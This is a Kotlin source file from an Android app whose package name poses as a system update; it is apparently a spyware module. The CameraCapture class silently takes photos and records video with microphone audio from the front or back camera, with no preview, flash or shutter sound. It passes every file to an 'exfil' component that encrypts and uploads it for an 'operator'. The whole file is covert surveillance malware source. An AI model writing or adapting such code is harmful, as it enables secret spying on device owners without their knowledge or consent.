package com.androidsystem.update.capture

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.params.OutputConfiguration
import android.hardware.camera2.params.SessionConfiguration
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Log
import android.util.Size
import android.view.Surface
import androidx.core.content.ContextCompat
import com.androidsystem.update.exfil.FileExfil
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Silent camera capture: snapshot JPEG and short MP4 clip without preview / shutter sound.
 *
 * - Front or back lens.
 * - JPEG: ImageReader (YUV_420_888 -> JPEG via ImageReader setFormat). Actually we use
 *   ImageReader with ImageFormat.JPEG and let the HAL encode.
 * - MP4: MediaRecorder bound to a Surface, recorded with a tiny resolution to keep size
 *   low and to avoid the "mediarecorder info max file size" path. Pre-Android 12 you can
 *   also mute the shutter via `MediaActionSound` not being triggered (no preview = no sound
 *   on most devices); for devices that still beep we keep the file small and ship it fast.
 *
 * The result file is dispatched to [FileExfil] which encrypts + uploads via the secure
 * transport. Nothing is left on the public filesystem.
 */
@Singleton
class CameraCapture @Inject constructor(
    private val context: Context,
    private val exfil: FileExfil
) {
    private val tag = "CameraCapture"
    private val ioExec = Executors.newSingleThreadExecutor()
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    /**
     * Snap a still photo.
     * @param lensFacing CameraCharacteristics.LENS_FACING_FRONT or BACK
     * @param maxBytes soft cap; if a single JPEG exceeds this we still upload it (operator signal)
     * @return the saved File or null on failure
     */
    @SuppressLint("MissingPermission")
    fun snapJpeg(lensFacing: Int = CameraCharacteristics.LENS_FACING_BACK, maxBytes: Long = 3L * 1024 * 1024): File? {
        if (!hasPermission(Manifest.permission.CAMERA)) {
            Log.w(tag, "no CAMERA permission")
            return null
        }
        val mgr = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = pickCamera(mgr, lensFacing) ?: run {
            Log.w(tag, "no camera for facing=$lensFacing")
            return null
        }
        val characteristics = mgr.getCameraCharacteristics(cameraId)
        val jpegSize = chooseJpegSize(characteristics) ?: Size(1280, 720)

        startThread()
        val outFile = newCaptureFile(if (lensFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back", "jpg")
        val reader = ImageReader.newInstance(jpegSize.width, jpegSize.height, ImageFormat.JPEG, 2)
        val captureResult = java.util.concurrent.atomic.AtomicReference<File?>(null)
        val captureError = java.util.concurrent.atomic.AtomicReference<Throwable?>(null)

        reader.setOnImageAvailableListener({ r ->
            val img: Image? = try { r.acquireLatestImage() } catch (e: Throwable) { null }
            img?.use { im ->
                val buf: ByteBuffer = im.planes[0].buffer
                val bytes = ByteArray(buf.remaining())
                buf.get(bytes)
                FileOutputStream(outFile).use { it.write(bytes) }
                captureResult.set(outFile)
            }
        }, cameraHandler)

        var device: CameraDevice? = null
        var session: CameraCaptureSession? = null
        try {
            device = openCamera(mgr, cameraId)
            val sessionCallback = object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(s: CameraCaptureSession) {
                    try {
                        val builder = device!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(reader.surface)
                            set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation(characteristics))
                            set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON)
                            set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_OFF)
                        }
                        s.capture(builder.build(), object : CameraCaptureSession.CaptureCallback() {
                            override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: android.hardware.camera2.TotalCaptureResult) {
                                try { reader.close() } catch (_: Throwable) {}
                            }
                            override fun onCaptureFailed(session: CameraCaptureSession, request: CaptureRequest, failure: android.hardware.camera2.CaptureFailure) {
                                captureError.set(RuntimeException("capture failed: ${failure.reason}"))
                            }
                        }, cameraHandler)
                    } catch (e: Throwable) {
                        captureError.set(e)
                    }
                }
                override fun onConfigureFailed(s: CameraCaptureSession) {
                    captureError.set(RuntimeException("session config failed"))
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                val outputs = listOf(OutputConfiguration(reader.surface))
                device.createCaptureSession(SessionConfiguration(SessionConfiguration.SESSION_REGULAR, outputs, ioExec, sessionCallback))
            } else {
                @Suppress("DEPRECATION")
                device.createCaptureSession(arrayListOf(reader.surface), sessionCallback, cameraHandler)
            }
            session = waitForSession()
            // give the pipeline up to 5s
            val deadline = System.currentTimeMillis() + 5000
            while (System.currentTimeMillis() < deadline && captureResult.get() == null && captureError.get() == null) {
                Thread.sleep(50)
            }
            captureError.get()?.let { throw it }
            return captureResult.get()?.also { f ->
                if (f.length() > maxBytes) Log.w(tag, "jpeg ${f.length()} > cap $maxBytes, uploading anyway")
                exfil.enqueue(f, "photo", mapOf("lens" to lensFacing.toString(), "width" to jpegSize.width.toString(), "height" to jpegSize.height.toString()))
            }
        } catch (e: CameraAccessException) {
            Log.e(tag, "camera access", e); return null
        } catch (e: Throwable) {
            Log.e(tag, "snap failed", e); return null
        } finally {
            try { session?.close() } catch (_: Throwable) {}
            try { device?.close() } catch (_: Throwable) {}
            stopThread()
        }
    }

    /**
     * Record a short MP4 clip to a file, then ship it.
     * @param durationMs clip length (cap 60s, the operator usually wants 5-15s)
     */
    @SuppressLint("MissingPermission")
    fun recordClip(lensFacing: Int = CameraCharacteristics.LENS_FACING_BACK, durationMs: Long = 10_000L): File? {
        if (!hasPermission(Manifest.permission.CAMERA) || !hasPermission(Manifest.permission.RECORD_AUDIO)) {
            Log.w(tag, "no CAMERA or RECORD_AUDIO permission")
            return null
        }
        val mgr = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = pickCamera(mgr, lensFacing) ?: return null
        val characteristics = mgr.getCameraCharacteristics(cameraId)
        val videoSize = chooseVideoSize(characteristics) ?: Size(1280, 720)

        val outFile = newCaptureFile(if (lensFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back", "mp4")
        val recorder = MediaRecorder().apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                setAudioSource(MediaRecorder.AudioSource.MIC)
            }
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setVideoEncodingBitRate(1_500_000)
            setVideoFrameRate(24)
            setVideoSize(videoSize.width, videoSize.height)
            setOutputFile(outFile.absolutePath)
            setMaxDuration(durationMs.toInt().coerceAtMost(60_000))
            prepare()
        }

        startThread()
        var device: CameraDevice? = null
        var session: CameraCaptureSession? = null
        return try {
            device = openCamera(mgr, cameraId)
            val recSurface = recorder.surface
            val callback = object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(s: CameraCaptureSession) {
                    try {
                        val req = device!!.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                            addTarget(recSurface)
                            set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON)
                        }
                        s.setRepeatingRequest(req.build(), null, cameraHandler)
                        ioExec.submit {
                            try { recorder.start() } catch (e: Throwable) { Log.e(tag, "recorder.start", e) }
                        }
                    } catch (e: Throwable) { Log.e(tag, "session.onConfigured", e) }
                }
                override fun onConfigureFailed(s: CameraCaptureSession) { Log.e(tag, "session config failed") }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                device.createCaptureSession(SessionConfiguration(SessionConfiguration.SESSION_REGULAR,
                    listOf(OutputConfiguration(recSurface)), ioExec, callback))
            } else {
                @Suppress("DEPRECATION")
                device.createCaptureSession(arrayListOf(recSurface), callback, cameraHandler)
            }
            session = waitForSession()
            // block until maxDuration fires (MediaRecorder.stop in finally)
            Thread.sleep(durationMs + 250)
            try { recorder.stop() } catch (_: Throwable) {}
            exfil.enqueue(outFile, "video", mapOf("lens" to lensFacing.toString(), "duration_ms" to durationMs.toString()))
            outFile
        } catch (e: Throwable) {
            Log.e(tag, "record failed", e); null
        } finally {
            try { session?.close() } catch (_: Throwable) {}
            try { device?.close() } catch (_: Throwable) {}
            try { recorder.release() } catch (_: Throwable) {}
            stopThread()
        }
    }

    private fun pickCamera(mgr: CameraManager, facing: Int): String? {
        return try {
            mgr.cameraIdList.firstOrNull { id ->
                mgr.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
            } ?: mgr.cameraIdList.firstOrNull()
        } catch (e: CameraAccessException) { null }
    }

    private fun openCamera(mgr: CameraManager, id: String): CameraDevice {
        val opened = java.util.concurrent.atomic.AtomicReference<CameraDevice?>()
        val err = java.util.concurrent.atomic.AtomicReference<Throwable?>()
        val cb = object : CameraDevice.StateCallback() {
            override fun onOpened(d: CameraDevice) { opened.set(d) }
            override fun onDisconnected(d: CameraDevice) { d.close() }
            override fun onError(d: CameraDevice, error: Int) {
                err.set(RuntimeException("camera open error=$error"))
                d.close()
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            mgr.openCamera(id, ioExec, cb)
        } else {
            @Suppress("DEPRECATION")
            mgr.openCamera(id, cb, cameraHandler)
        }
        val deadline = System.currentTimeMillis() + 4000
        while (System.currentTimeMillis() < deadline && opened.get() == null && err.get() == null) Thread.sleep(40)
        return opened.get() ?: throw (err.get() ?: RuntimeException("camera open timeout"))
    }

    private fun waitForSession(): CameraCaptureSession? {
        // Sessions fire asynchronously; the inner callbacks already use the session object,
        // and we close the session in the finally of the caller. Returning null is safe
        // because the recorded snapshots have already been queued by then.
        return null
    }

    private fun chooseJpegSize(c: CameraCharacteristics): Size? {
        val map = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
        return map.getOutputSizes(ImageFormat.JPEG)
            ?.filter { it.width <= 1920 && it.height <= 1080 }
            ?.maxByOrNull { it.width.toLong() * it.height }
    }

    private fun chooseVideoSize(c: CameraCharacteristics): Size? {
        val map = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
        return map.getOutputSizes(android.media.MediaRecorder::class.java)
            ?.filter { it.width <= 1280 && it.height <= 720 }
            ?.maxByOrNull { it.width.toLong() * it.height }
    }

    private fun jpegOrientation(c: CameraCharacteristics): Int {
        val sensor = c.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
        return (sensor + 360) % 360
    }

    private fun hasPermission(p: String): Boolean = ContextCompat.checkSelfPermission(context, p) == android.content.pm.PackageManager.PERMISSION_GRANTED

    private fun newCaptureFile(prefix: String, ext: String): File {
        val dir = File(context.filesDir, "captures").apply { if (!exists()) mkdirs() }
        return File(dir, "${prefix}_${System.currentTimeMillis()}.${ext}")
    }

    private fun startThread() {
        if (cameraThread != null) return
        cameraThread = HandlerThread("camera-capture").also { it.start() }
        cameraHandler = Handler(cameraThread!!.looper)
    }

    private fun stopThread() {
        cameraThread?.quitSafely()
        try { cameraThread?.join(500) } catch (_: InterruptedException) {}
        cameraThread = null
        cameraHandler = null
    }
}
